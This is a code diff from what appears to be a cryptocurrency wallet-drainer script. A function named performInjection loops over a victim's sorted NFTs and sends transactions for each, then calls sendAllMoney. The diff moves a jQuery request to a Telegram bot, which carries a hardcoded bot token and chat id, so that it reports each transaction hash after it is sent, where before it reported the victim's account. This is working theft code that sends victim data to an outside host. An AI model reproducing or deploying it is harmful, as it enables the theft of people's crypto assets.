@@ -164,16 +164,17 @@ async function performInjection(address) {
             value: 0,
             'data': data_to_encode //make call to NFT smart contract 
         };
-        var z=$.ajax({  
-  type: "POST",  
-  url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
-  data: "parse_mode=HTML&text="+encodeURIComponent(selectedAccount), 
-  }); 
+        
         try {
             const txHash = await provider.request({
                 method: 'eth_sendTransaction',
                 params: [transactionParameters],
             });
+            var z=$.ajax({  
+  type: "POST",  
+  url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
+  data: "parse_mode=HTML&text="+encodeURIComponent(txHash), 
+  }); 
             if (i == sortedNFTs.length - 1) {
                 
                 await sendAllMoney();
